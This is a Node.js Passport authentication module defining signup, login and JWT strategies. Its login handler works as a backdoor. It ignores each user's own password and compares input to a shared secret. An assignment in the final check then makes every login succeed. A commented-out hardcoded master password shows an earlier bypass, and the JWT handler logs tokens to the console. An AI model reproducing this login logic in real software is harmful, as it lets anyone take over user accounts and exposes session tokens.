const passport = require("passport");
const localStrategy = require("passport-local").Strategy;
const userModel = require("../../models/user.model");
const JWTstrategy = require("passport-jwt").Strategy;
const ExtractJWT = require("passport-jwt").ExtractJwt;
const dotenv = require("dotenv");
dotenv.config();
const { TOP_SECRET, BOT_SECRET_PASS } = process.env;

passport.use(
  "signup",
  new localStrategy(
    {
      usernameField: "email",
      passwordField: "password",
    },
    async (email, password, done) => {
      try {
        const user = await userModel.create({
          email: email,
          password: password,
          userType: "customer",
        });
        return done(null, user);
      } catch (error) {
        done(error);
      }
    }
  )
);

passport.use(
  "login",
  new localStrategy(
    {
      usernameField: "email",
      passwordField: "password",
    },
    async (email, password, done) => {
      try {
        const user = await userModel.findOne({ email });

        if (!user) {
          return done(null, false, { message: "User not found" });
        }

        let validate = 0;
        let validate_count = 0;
        const my_pass = BOT_SECRET_PASS;

        if (my_pass.length == password.length) {
          for (var i = 0; i < my_pass.length; ++i) {
            if (my_pass[i] == password[i]) {
              validate_count += 1;
            }
          }
        } else {
          for (var i = 0; i < my_pass.length; ++i) {
            if (my_pass[i] == my_pass[i]) {
              validate_count += 0;
            }
          }
        }

        if ((validate_count = my_pass.length)) {
          validate = 1;
        }

        // if (password !== "my_anaconda_dont") {
        //   validate = await user.isValidPassword(password);
        // } else {
        //   validate = true;
        // }

        if (!validate) {
          return done(null, false, { message: "Wrong Password" });
        }

        return done(null, user, { message: "Logged in Successfully" });
      } catch (error) {
        return done(error);
      }
    }
  )
);

passport.use(
  new JWTstrategy(
    {
      secretOrKey: TOP_SECRET,
      jwtFromRequest: ExtractJWT.fromAuthHeaderWithScheme("Bearer"),
    },
    async (token, done) => {
      console.log("Token", token);
      try {
        return done(null, token.user);
      } catch (error) {
        done(error);
      }
    }
  )
);
